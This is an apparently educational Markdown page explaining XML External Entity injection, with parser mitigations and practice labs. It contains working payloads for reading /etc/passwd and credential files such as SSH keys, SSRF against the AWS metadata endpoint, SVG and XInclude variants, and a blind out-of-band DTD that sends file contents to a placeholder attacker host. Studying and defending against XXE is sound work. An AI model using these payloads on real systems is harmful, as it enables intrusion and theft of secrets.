---
layout: default
title: XXE (XML External Entity)
---

# XXE — XML External Entity Injection

## What is XXE

XXE occurs when an application parses XML input and the XML parser is configured to process external entity declarations. An attacker can define an external entity that references a local file or remote URL, and the parser will fetch and return its contents.

---

## What is an XML Entity

XML entities are shortcuts for values inside an XML document.

Internal entity:
```xml
<!DOCTYPE foo [ <!ENTITY name "value"> ]>
<root>&name;</root>
```

The parser replaces `&name;` with `value`.

External entity — fetches content from a file or URL:
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>
<root>&ext;</root>
```

The parser fetches `/etc/passwd` and substitutes it into the XML.

---

## Basic XXE — File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

If the application reflects the `data` value in its response, you will see the contents of `/etc/passwd`.

---

## Common Files to Target

**Linux:**
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///home/user/.ssh/id_rsa
file:///var/www/html/config.php
file:///proc/self/environ

**Windows:**
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config

---

## SSRF via XXE

XXE can be used to make server-side requests:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

This hits the AWS metadata endpoint from the server.

---

## Blind XXE

When no output is reflected in the response.

### Out-of-band data exfiltration

Create a malicious DTD file on your server (`evil.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://YOUR-IP/?data=%file;'>">
%oob;
```

Payload to send to the target:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-IP/evil.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

The target fetches your DTD, which forces an HTTP request to your server containing the file contents in the URL.

### Error-based XXE

Trigger a parser error containing the file contents:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY oops SYSTEM 'file:///nonexistent/%file;'>">
%error;
```

The error message includes the file content.

---

## XXE in Different Content Types

XXE is not limited to XML POST bodies. Look for XML processing in:

- SOAP web services
- SVG file uploads
- DOCX, XLSX, PPTX file uploads (these are zipped XML)
- RSS or Atom feeds
- Content-Type: application/xml or text/xml
- JSON endpoints that also accept XML (try changing Content-Type)

### XXE via SVG upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

Upload this as an SVG file. If the server renders it, the file contents appear.

---

## XInclude Attack

When you cannot control the DOCTYPE but can inject into an XML value:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## Tools

- **Burp Suite** — intercept XML requests and inject payloads
- **Burp Collaborator** — detect blind XXE via OOB callbacks
- **XXEinjector** — automated XXE exploitation tool

---

## Mitigations

- Disable external entity processing in the XML parser — this is the most important fix
- Disable DTD processing entirely if not needed
- Use less complex formats like JSON where possible
- Keep XML libraries updated
- Use a WAF with XXE rules

### Disabling external entities by language

**PHP:**
```php
libxml_disable_entity_loader(true);
```

**Java:**
```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**Python:**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False)
```

---

## Practice Labs

- PortSwigger Web Academy: XXE labs (free, very comprehensive)
- TryHackMe: XXE room
- HackTheBox machines: Aragog

---

## Key Terms

| Term | Meaning |
|------|---------|
| XXE | XML External Entity injection |
| DTD | Document Type Definition — defines XML structure |
| External entity | Entity that fetches content from file or URL |
| Blind XXE | No output reflected — detected via OOB |
| OOB | Out-of-band — exfiltrate data via DNS or HTTP |
| XInclude | XML standard for including external content |
| SYSTEM | DTD keyword for referencing external resources |
